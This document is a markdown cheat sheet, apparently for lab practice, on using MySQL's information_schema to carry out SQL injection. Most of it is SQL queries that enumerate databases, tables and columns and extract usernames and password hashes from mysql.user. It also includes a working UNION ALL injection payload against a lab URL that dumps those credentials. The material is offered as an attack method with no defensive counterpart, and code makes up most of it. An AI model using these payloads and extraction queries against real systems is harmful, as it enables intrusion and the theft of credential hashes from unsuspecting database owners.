# 📚 Using `information_schema` for SQL Injection

`information_schema` allows attackers to discover database organization without prior knowledge. Here's how attackers leverage it:

---
## Common MySQL Enumeration Commands

- **Login mysql in server side:**
```bash
mysql -u root -p
```
- **Show all databases**
```sql
show databases;
```
- **Switch to a database (e.g., mysql)**
```sql 
use mysql;
```
- **List tables in the current database**
```sql 
show tables;
```
- **Get all users (for root access databases)**
```sql 
select * from user;
```
```sql 
select user, authentication_string from user;
```
- **Switch to information\_schema database**
```sql 
use information_schema;
```
- **List all tables in information\_schema**
```sql 
select * from TABLES;
```
```sql 
select TABLE_SCHEMA from TABLES;
```
```sql 
select TABLE_SCHEMA from TABLES GROUP BY TABLE_SCHEMA;
```
- Switch to custom/app databases (Example:armour_db)
```sql
use armour_db;
```
---
## Get All Database Names


```sql
select TABLE_SCHEMA from information_schema.TABLES;
```

```sql
select TABLE_SCHEMA from information_schema.TABLES GROUP BY TABLE_SCHEMA;
```

```sql
select TABLE_SCHEMA from information_schema.TABLES GROUP BY TABLE_SCHEMA LIMIT 0,1;
```

```sql
select TABLE_SCHEMA from information_schema.TABLES GROUP BY TABLE_SCHEMA LIMIT 1,1;
```

```sql
select TABLE_SCHEMA from information_schema.TABLES GROUP BY TABLE_SCHEMA LIMIT 2,1;
```

```sql
select TABLE_SCHEMA from information_schema.TABLES GROUP BY TABLE_SCHEMA LIMIT 3,1;
```

```sql
select TABLE_SCHEMA from information_schema.TABLES GROUP BY TABLE_SCHEMA LIMIT 4,1;
```

```sql
select TABLE_SCHEMA from information_schema.TABLES GROUP BY TABLE_SCHEMA LIMIT 5,1;
```


### **Alternative: Get all database names at once**

```sql

select group_concat(TABLE_SCHEMA) from information_schema.TABLES GROUP BY TABLE_SCHEMA;
```

---
## Get All Table Names


```sql
select TABLE_SCHEMA, TABLE_NAME from information_schema.TABLES;
```

```sql
select TABLE_SCHEMA, TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA="mysql";
```

```sql
select TABLE_SCHEMA, TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA="mysql" LIMIT 0,1;
```

```sql
select TABLE_SCHEMA, TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA="mysql" LIMIT 1,1;
```

```sql
select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA="mysql" LIMIT 0,1;
```

```sql
select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA="mysql" LIMIT 30,1;
```

```sql
select TABLE_NAME from information_schema.COLUMNS where TABLE_SCHEMA="mysql" GROUP BY TABLE_NAME;
```


### Alternative: All tables as comma list


```sql
select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA="mysql";
```

---

## Get All Column Names


```sql
select TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA="mysql" AND TABLE_NAME="columns_priv";
```

```sql
select TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA="mysql" AND TABLE_NAME="user" LIMIT 1,1;
```

```sql
select TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA="mysql" AND TABLE_NAME="user" LIMIT 40,1;
```
### Alternative: All columns in one list

```sql
select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA="mysql" AND TABLE_NAME="user";
```

---
## Extracting User Data

With knowledge of columns, attackers can extract user credentials.


```sql
SELECT User, authentication_string FROM mysql.user;
```

```sql
SELECT User, authentication_string FROM mysql.user LIMIT 0,1;
```

```sql
SELECT User FROM mysql.user LIMIT 1,1;
```

```sql
SELECT group_concat(authentication_string) from mysql.users;
```

```sql
SELECT group_concat(User), group_concat(authentication_string) from mysql.users;
```

```sql
SELECT name, email from armour_db.users;
```

* These reveal all users and their password hashes (or authentication strings).

---

## Example: SQL Injection via Union and information_schema (Payload)

A practical SQL payload to list users and hashes using **UNION ALL**:

```sql
http://192.168.1.30/webpen/sqli/error-based-string.php?id=-1' UNION ALL SELECT GROUP_CONCAT(User), GROUP_CONCAT(authentication_string), 3, 4, 5 FROM mysql.user--
```

* The specific number of columns here (`3, 4, 5`) must match the original query's column count in the vulnerable application.

---


## 🧭 Enumerating Databases

Attackers use these queries to list or enumerate the names of all databases:

```sql
SELECT TABLE_SCHEMA FROM information_schema.TABLES GROUP BY TABLE_SCHEMA;
```
```sql
SELECT GROUP_CONCAT(TABLE_SCHEMA) FROM information_schema.TABLES GROUP BY TABLE_SCHEMA;
```

* 📜 The first returns each database name individually.
* 🧩 The second uses `GROUP_CONCAT` to get all database names in a single row.

---

## 🗂️ Enumerating Tables

To find all table names in a particular database (e.g., `mysql`):

```sql
SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='mysql';
```
```sql
SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA='mysql';
```
```sql
SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='armour_db';
```

* 🔎 The condition `WHERE TABLE_SCHEMA='mysql'` restricts the results to only the specified database.
* 📦 `GROUP_CONCAT` conveniently returns all table names in one result.

---

## 🧾 Enumerating Columns

Attackers identify column names in a specific table (e.g., `user` table in the `mysql` database):

```sql
SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='mysql' AND TABLE_NAME='user';
```
```sql
SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='mysql' AND TABLE_NAME='user';
```
```sql
SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='armour_db' AND TABLE_NAME='users';
```

* 🔐 This is crucial for understanding which columns contain valuable data such as usernames or passwords.

---

## Summary Table: Common Enumeration Queries

| Purpose | Example Query |
| :--- | :--- |
| List database names | `SELECT TABLE_SCHEMA FROM information_schema.TABLES GROUP BY TABLE_SCHEMA;` |
| List tables in a DB | `SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='mysql';` |
| List columns in a table | `SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='mysql' AND TABLE_NAME='user';` |
| Extract usernames & hashes | `SELECT User, authentication_string FROM mysql.user;` |
| All items as single row / value | `SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA='mysql';` |


**Note** : Exploiting **information_schema** is a fundamental step in SQL injection attacks, especially for privilege escalation or extracting sensitive data from a compromised server.

 The **information_schema** database is a critical resource for SQL attackers because it stores metadata about every other database, table, and column in MySQL. It enables enumeration of the database structure—essential for exploiting a SQL injection vulnerability.

---